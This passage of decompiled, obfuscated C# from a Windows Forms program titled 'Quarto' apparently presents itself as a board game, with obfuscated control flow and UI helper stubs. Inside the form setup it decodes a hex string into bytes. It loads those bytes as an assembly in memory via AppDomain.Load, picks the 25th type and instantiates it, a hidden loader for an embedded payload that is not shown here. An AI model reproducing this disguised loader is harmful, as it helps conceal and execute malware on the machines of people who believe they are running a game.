					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)richTextBox1);
					num = (int)((num2 * 927061974) ^ 0x34D5528);
					continue;
				case 45u:
				{
					int num4;
					int num5;
					if (!flag)
					{
						num4 = -1159523696;
						num5 = -1159523696;
					}
					else
					{
						num4 = -2083475580;
						num5 = -2083475580;
					}
					num = num4 ^ (int)(num2 * 500710556);
					continue;
				}
				case 44u:
					Form1.smethod_3((Control)(object)pictureBox1, new Size(246, 246));
					num = (int)(num2 * 820281719) ^ -949979509;
					continue;
				case 43u:
					num = (int)(num2 * 472253149) ^ -596060082;
					continue;
				case 42u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)pictureBox1);
					num = (int)(num2 * 2035436643) ^ -1937631123;
					continue;
				case 41u:
					Form1.smethod_88((Form)(object)this, (EventHandler)Form1_Shown);
					num = (int)(num2 * 1697083445) ^ -832648003;
					continue;
				case 40u:
					Form1.smethod_86((Form)(object)this, bool_0: false);
					num = ((int)num2 * -573889456) ^ 0x1CDB23A2;
					continue;
				case 39u:
					richTextBox1 = Form1.smethod_54();
					num = (int)((num2 * 711414943) ^ 0x327052D8);
					continue;
				case 38u:
					Form1.smethod_32((Control)(object)button1, "Меню");
					num = ((int)num2 * -705090929) ^ -1136940809;
					continue;
				case 37u:
					num = (int)(num2 * 60828755) ^ -290027045;
					continue;
				case 36u:
					Form1.smethod_64((Control)(object)label6, 13);
					num = ((int)num2 * -1677675479) ^ 0x6456A231;
					continue;
				case 35u:
					Form1.smethod_70(ComMember, object_);
					num = (int)(num2 * 1192027182) ^ -1813801521;
					continue;
				case 34u:
					label2 = Form1.smethod_57();
					num = ((int)num2 * -1910713219) ^ -1149319974;
					continue;
				case 33u:
					Form1.smethod_65((Control)(object)richTextBox1, bool_0: false);
					num = ((int)num2 * -1226885377) ^ -334957563;
					continue;
				case 32u:
					label5 = Form1.smethod_57();
					label6 = Form1.smethod_57();
					Form1.smethod_58((ISupportInitialize)pictureBox1);
					num = (int)((num2 * 422625782) ^ 0x43502747);
					continue;
				case 31u:
					Form1.smethod_3((Control)(object)label6, new Size(0, 16));
					num = ((int)num2 * -270062440) ^ 0x3BC60B4D;
					continue;
				case 30u:
					Form1.smethod_3((Control)(object)panel1, new Size(486, 240));
					Form1.smethod_64((Control)(object)panel1, 7);
					num = ((int)num2 * -1570467141) ^ 0x2A0C38D2;
					continue;
				case 29u:
					Form1.smethod_4((Control)(object)label2, new Point(0, 0));
					num = (int)(num2 * 633755824) ^ -880979461;
					continue;
				case 28u:
					num = ((int)num2 * -2011599618) ^ -729133745;
					continue;
				case 27u:
					Form1.smethod_5((Control)(object)richTextBox1, Color.White);
					num = (int)(num2 * 380145524) ^ -274686696;
					continue;
				case 26u:
					num = ((int)num2 * -1495001285) ^ -351150412;
					continue;
				case 25u:
					Form1.smethod_77((Control)(object)label1, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = (int)(num2 * 829142473) ^ -1878880379;
					continue;
				case 24u:
					Form1.smethod_66((ButtonBase)(object)button2, bool_0: true);
					Form1.smethod_67((Control)(object)button2, (EventHandler)Button2_Click);
					num = (int)(num2 * 1323614526) ^ -134151901;
					continue;
				case 23u:
					array[num3] = Form1.smethod_69(Form1.smethod_68(string_, num3 * 2, 2), 16);
					num = -388635114;
					continue;
				case 22u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)button1);
					num = (int)(num2 * 2103755188) ^ -902691585;
					continue;
				case 21u:
					CharArray(array, string.Empty);
					num = ((int)num2 * -1468314080) ^ -760700978;
					continue;
				case 20u:
					num = (int)(num2 * 1194003501) ^ -462251686;
					continue;
				case 19u:
					num = ((int)num2 * -1180337327) ^ 0x59EBC31C;
					continue;
				case 18u:
					num = (int)(num2 * 1832431805) ^ -1292588459;
					continue;
				case 17u:
					Form1.smethod_92((Control)(object)this);
					num = (int)((num2 * 1186868076) ^ 0x24C56F6B);
					continue;
				case 16u:
					Form1.smethod_67((Control)(object)button1, (EventHandler)Button1_Click);
					num = ((int)num2 * -854801397) ^ 0xBECDAD;
					continue;
				case 15u:
					Form1.smethod_4((Control)(object)label5, new Point(197, 0));
					num = ((int)num2 * -638810283) ^ 0x2390C8A8;
					continue;
				case 14u:
					Form1.smethod_72(timer1, 1000);
					num = ((int)num2 * -853634188) ^ 0x51592307;
					continue;
				case 13u:
					num = (int)((num2 * 1536540937) ^ 0x377AB3F);
					continue;
				case 12u:
					Form1.smethod_61((Control)(object)button1, "button1");
					num = ((int)num2 * -193107888) ^ 0x16135FC0;
					continue;
				case 11u:
					Form1.smethod_64((Control)(object)richTextBox1, 6);
					num = (int)((num2 * 2043276579) ^ 0x1F0CFF52);
					continue;
				case 10u:
					Form1.smethod_65((Control)(object)button2, bool_0: false);
					num = ((int)num2 * -1016733367) ^ 0x6414F5A7;
					continue;
				case 9u:
					num = (int)((num2 * 80017879) ^ 0x22F4EE5);
					continue;
				case 8u:
					Form1.smethod_78((Control)(object)label1, (RightToLeft)0);
					Form1.smethod_3((Control)(object)label1, new Size(0, 16));
					Form1.smethod_64((Control)(object)label1, 8);
					num = ((int)num2 * -851043922) ^ -1998696674;
					continue;
				case 7u:
					Form1.smethod_6((Control)(object)pictureBox1, new MouseEventHandler(PictureBox1_MouseDown));
					num = (int)((num2 * 1915406485) ^ 0x2E4B164);
					continue;
				case 6u:
					Form1.smethod_3((Control)(object)button2, new Size(83, 35));
					num = (int)(num2 * 1582931966) ^ -764379436;
					continue;
				case 5u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)button2);
					num = (int)((num2 * 494420403) ^ 0x247B456D);
					continue;
				case 4u:
					Form1.smethod_32((Control)(object)this, "Quarto");
					Form1.smethod_87((Form)(object)this, (EventHandler)Form1_Load);
					num = (int)((num2 * 1992250088) ^ 0x6152162C);
					continue;
				case 3u:
					label1 = Form1.smethod_57();
					num = ((int)num2 * -941899269) ^ 0x765D4727;
					continue;
				case 2u:
					components = Form1.smethod_52();
					pictureBox1 = Form1.smethod_2();
					button2 = Form1.smethod_53();
					num = ((int)num2 * -268567271) ^ 0x8F8F4C3;
					continue;
				case 1u:
					Form1.smethod_74((Control)(object)label1, bool_0: true);
					num = (int)(num2 * 1127991145) ^ -1961007183;
					continue;
				case 0u:
					num = (int)(num2 * 1088874487) ^ -1682002124;
					continue;
				default:
					return;
				case 119u:
					break;
				case 55u:
					return;
				}
				break;
			}
		}
	}

	private static void CharArray(byte[] Level, string po)
	{
		Assembly q = ContextAdd(Level);
		while (true)
		{
			int num = -339246728;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x8FB4193Bu) % 3u)
				{
				case 2u:
					goto IL_0009;
				default:
					return;
				case 0u:
					break;
				case 1u:
					return;
				}
				break;
				IL_0009:
				PerformTable(q);
				num = ((int)num2 * -1777572738) ^ 0x47DD924F;
			}
		}
	}

	private static Assembly ContextAdd(byte[] Position)
	{
		Assembly result = default(Assembly);
		while (true)
		{
			int num = -1522975589;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x86658760u) % 4u)
				{
				case 3u:
					result = Form1.smethod_94(Form1.smethod_93(), Position);
					num = ((int)num2 * -1533134954) ^ -1759095274;
					continue;
				case 0u:
					num = ((int)num2 * -652501177) ^ 0x5ADDD251;
					continue;
				case 2u:
					break;
				default:
					return result;
				}
				break;
			}
		}
	}

	private static void PerformTable(Assembly Q3)
	{
		ComMember = Form1.smethod_95(Q3)[24];
	}

	static Random smethod_0()
	{
		return new Random();
	}

	static void smethod_1(RichTextBox richTextBox_0, HorizontalAlignment horizontalAlignment_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		richTextBox_0.set_SelectionAlignment(horizontalAlignment_0);
	}

	static PictureBox smethod_2()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new PictureBox();
	}

	static void smethod_3(Control control_0, Size size_0)
	{
		control_0.set_Size(size_0);
	}

	static void smethod_4(Control control_0, Point point_0)
	{
		control_0.set_Location(point_0);
	}

	static void smethod_5(Control control_0, Color color_0)
	{
		control_0.set_BackColor(color_0);
	}

	static void smethod_6(Control control_0, MouseEventHandler mouseEventHandler_0)
	{
		control_0.add_MouseDown(mouseEventHandler_0);
	}

	static void smethod_7(Control control_0, bool bool_0)
	{
		control_0.set_Enabled(bool_0);
	}

	static ControlCollection smethod_8(Control control_0)
	{
		return control_0.get_Controls();
	}

	static void smethod_9(ControlCollection controlCollection_0, Control control_0)
	{
		controlCollection_0.Add(control_0);
	}

	static void smethod_10(Form form_0, Form form_1)
	{
		form_0.set_Owner(form_1);
	}

	static void smethod_11(Control control_0)
	{
		control_0.Show();
	}

	static Point smethod_12(Form form_0)
	{
		return form_0.get_Location();
	}

	static void smethod_13(Form form_0, Point point_0)
	{
		form_0.set_Location(point_0);
	}

	static void smethod_14(Form form_0)
	{
		form_0.Activate();
	}

	static void smethod_15(Timer timer_0)
	{
		timer_0.Stop();
	}

	static int smethod_16(Control control_0)
	{
		return control_0.get_Height();
	}

	static void smethod_17(Control control_0, int int_0)
	{
		control_0.set_Height(int_0);
	}

	static int smethod_18(Control control_0)
	{
		return control_0.get_Width();
	}

	static Bitmap smethod_19(int int_0, int int_1)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Expected O, but got Unknown
		return new Bitmap(int_0, int_1);
	}

	static void smethod_20(PictureBox pictureBox_0, Image image_0)
	{
		pictureBox_0.set_Image(image_0);
	}

	static Image smethod_21(PictureBox pictureBox_0)
	{
		return pictureBox_0.get_Image();
	}

	static Graphics smethod_22(Image image_0)
	{
		return Graphics.FromImage(image_0);
	}

	static Brush smethod_23()
	{
		return Brushes.get_OldLace();
	}

	static void smethod_24(Graphics graphics_0, Brush brush_0, float float_0, float float_1, float float_2, float float_3)
	{
		graphics_0.FillEllipse(brush_0, float_0, float_1, float_2, float_3);
	}

	static Brush smethod_25()
	{
		return Brushes.get_Sienna();
	}

	static Brush smethod_26()
	{
		return Brushes.get_BurlyWood();
	}

	static double smethod_27(double double_0)
	{
		return Math.Sqrt(double_0);
	}

	static void smethod_28(Graphics graphics_0, Brush brush_0, float float_0, float float_1, float float_2, float float_3)
	{
		graphics_0.FillRectangle(brush_0, float_0, float_1, float_2, float_3);
	}

	static SolidBrush smethod_29(Color color_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		return new SolidBrush(color_0);
	}

	static void smethod_30(Control control_0)
	{
		control_0.Refresh();
	}

	static EventArgs smethod_31()
	{
		return new EventArgs();
	}

	static void smethod_32(Control control_0, string string_0)
	{
		control_0.set_Text(string_0);
	}

	static int smethod_33(Random random_0, int int_0)
	{
		return random_0.Next(int_0);
	}

	static string smethod_34(string string_0, string string_1)
	{
		return string_0 + string_1;
	}

	static void smethod_35(Timer timer_0, bool bool_0)
	{
		timer_0.set_Enabled(bool_0);
	}

	static void smethod_36(Timer timer_0)
	{
		timer_0.Start();
	}

	static Point smethod_37(Control control_0)
	{
		return control_0.get_Location();
	}

	static int smethod_38(MouseEventArgs mouseEventArgs_0)
	{
		return mouseEventArgs_0.get_X();
	}

	static int smethod_39(MouseEventArgs mouseEventArgs_0)
	{
		return mouseEventArgs_0.get_Y();
	}

	static Color smethod_40(Bitmap bitmap_0, int int_0, int int_1)
	{
		return bitmap_0.GetPixel(int_0, int_1);
	}

	static Color smethod_41(Control control_0)
	{
		return control_0.get_BackColor();
	}

	static Pen smethod_42(Color color_0, float float_0)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Expected O, but got Unknown
		return new Pen(color_0, float_0);
	}

	static void smethod_43(Graphics graphics_0, Pen pen_0, float float_0, float float_1, float float_2, float float_3)
	{
		graphics_0.DrawEllipse(pen_0, float_0, float_1, float_2, float_3);
	}

	static void smethod_44(Graphics graphics_0, Image image_0, int int_0, int int_1, Rectangle rectangle_0, GraphicsUnit graphicsUnit_0)
	{
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		graphics_0.DrawImage(image_0, int_0, int_1, rectangle_0, graphicsUnit_0);
	}

	static void smethod_45(Graphics graphics_0)
	{
		graphics_0.Dispose();
	}

	static bool smethod_46(Control control_0)
	{
		return control_0.get_Enabled();
	}

	static void smethod_47(int int_0)
	{
		Thread.Sleep(int_0);
	}

	static object smethod_48(Array array_0)
	{
		return array_0.Clone();
	}

	static int smethod_49(Control control_0)
	{
		return control_0.get_Width();
	}

	static void smethod_50(Control control_0, int int_0)
	{
		control_0.set_Left(int_0);
	}

	static void smethod_51(IDisposable idisposable_0)
	{
		idisposable_0.Dispose();
	}

	static Container smethod_52()
	{
		return new Container();
	}

	static Button smethod_53()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Button();
	}

	static RichTextBox smethod_54()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new RichTextBox();
	}

	static Panel smethod_55()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Panel();
	}

	static Timer smethod_56(IContainer icontainer_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		return new Timer(icontainer_0);
	}

	static Label smethod_57()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Label();
	}

	static void smethod_58(ISupportInitialize isupportInitialize_0)
	{
		isupportInitialize_0.BeginInit();
	}

	static void smethod_59(Control control_0)
	{
		control_0.SuspendLayout();
	}

	static void smethod_60(PictureBox pictureBox_0, BorderStyle borderStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		pictureBox_0.set_BorderStyle(borderStyle_0);
	}

	static void smethod_61(Control control_0, string string_0)
	{
		control_0.set_Name(string_0);
	}

	static void smethod_62(PictureBox pictureBox_0, int int_0)
	{
		pictureBox_0.set_TabIndex(int_0);
	}

	static void smethod_63(PictureBox pictureBox_0, bool bool_0)
	{
		pictureBox_0.set_TabStop(bool_0);
	}

	static void smethod_64(Control control_0, int int_0)
	{
		control_0.set_TabIndex(int_0);
	}

	static void smethod_65(Control control_0, bool bool_0)
	{
		control_0.set_TabStop(bool_0);
	}

	static void smethod_66(ButtonBase buttonBase_0, bool bool_0)
	{
		buttonBase_0.set_UseVisualStyleBackColor(bool_0);
	}

	static void smethod_67(Control control_0, EventHandler eventHandler_0)
	{
		control_0.add_Click(eventHandler_0);
	}

	static string smethod_68(string string_0, int int_0, int int_1)
	{
		return string_0.Substring(int_0, int_1);
	}

	static byte smethod_69(string string_0, int int_0)
	{
		return Convert.ToByte(string_0, int_0);
	}

	static object smethod_70(Type type_0, object[] object_0)
	{
		return Activator.CreateInstance(type_0, object_0);
	}

	static void smethod_71(TextBoxBase textBoxBase_0, bool bool_0)
	{
		textBoxBase_0.set_ReadOnly(bool_0);
	}

	static void smethod_72(Timer timer_0, int int_0)
	{
		timer_0.set_Interval(int_0);
	}

	static void smethod_73(Timer timer_0, EventHandler eventHandler_0)
	{
		timer_0.add_Tick(eventHandler_0);
	}

	static void smethod_74(Control control_0, bool bool_0)
	{
		control_0.set_AutoSize(bool_0);
	}

	static void smethod_75(Control control_0, DockStyle dockStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		control_0.set_Dock(dockStyle_0);
	}

	static Font smethod_76(string string_0, float float_0, FontStyle fontStyle_0, GraphicsUnit graphicsUnit_0, byte byte_0)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0003: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Expected O, but got Unknown
		return new Font(string_0, float_0, fontStyle_0, graphicsUnit_0, byte_0);
	}

	static void smethod_77(Control control_0, Font font_0)
	{
		control_0.set_Font(font_0);
	}

	static void smethod_78(Control control_0, RightToLeft rightToLeft_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		control_0.set_RightToLeft(rightToLeft_0);
	}

	static void smethod_79(ContainerControl containerControl_0, SizeF sizeF_0)
	{
		containerControl_0.set_AutoScaleDimensions(sizeF_0);
	}

	static void smethod_80(ContainerControl containerControl_0, AutoScaleMode autoScaleMode_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		containerControl_0.set_AutoScaleMode(autoScaleMode_0);
	}

	static void smethod_81(Form form_0, Size size_0)
	{
		form_0.set_ClientSize(size_0);
	}

	static ControlCollection smethod_82(Control control_0)
	{
		return control_0.get_Controls();
	}

	static void smethod_83(Form form_0, FormBorderStyle formBorderStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		form_0.set_FormBorderStyle(formBorderStyle_0);
	}

	static void smethod_84(Form form_0, bool bool_0)
	{
		form_0.set_MaximizeBox(bool_0);
	}

	static void smethod_85(Control control_0, string string_0)
	{
		control_0.set_Name(string_0);
	}

	static void smethod_86(Form form_0, bool bool_0)
	{
		form_0.set_ShowIcon(bool_0);
	}

	static void smethod_87(Form form_0, EventHandler eventHandler_0)
	{
		form_0.add_Load(eventHandler_0);
	}

	static void smethod_88(Form form_0, EventHandler eventHandler_0)
	{
		form_0.add_Shown(eventHandler_0);
	}

	static void smethod_89(Control control_0, EventHandler eventHandler_0)
	{
		control_0.add_LocationChanged(eventHandler_0);
	}

	static void smethod_90(ISupportInitialize isupportInitialize_0)
	{
		isupportInitialize_0.EndInit();
	}

	static void smethod_91(Control control_0, bool bool_0)
	{
		control_0.ResumeLayout(bool_0);
	}

	static void smethod_92(Control control_0)
	{
		control_0.PerformLayout();
	}

	static AppDomain smethod_93()
	{
		return AppDomain.CurrentDomain;
	}

	static Assembly smethod_94(AppDomain appDomain_0, byte[] byte_0)
	{
		return appDomain_0.Load(byte_0);
	}

	static Type[] smethod_95(Assembly assembly_0)
	{
		return assembly_0.GetTypes();
	}
}
